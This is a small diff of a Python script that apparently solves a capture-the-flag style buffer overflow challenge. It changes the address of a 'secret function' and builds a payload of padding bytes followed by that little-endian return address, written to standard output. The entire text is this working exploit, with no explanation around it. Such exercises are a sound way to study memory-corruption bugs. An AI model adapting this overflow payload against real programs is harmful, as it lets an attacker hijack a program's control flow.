@@ -1,6 +1,6 @@
-# 080491a6 address of secret function
+# 0804848f address of secret function
 import sys
 
-payload = b"a" * 32 + b"bbbbccccdddd"
-payload += b"\x08\x04\x91\xa6"[::-1]
+address = b"\x08\x04\x84\x8f"[::-1]
+payload = b"A" * 32 + b"BBBBCCCCDDDD" + address
 sys.stdout.buffer.write(payload)
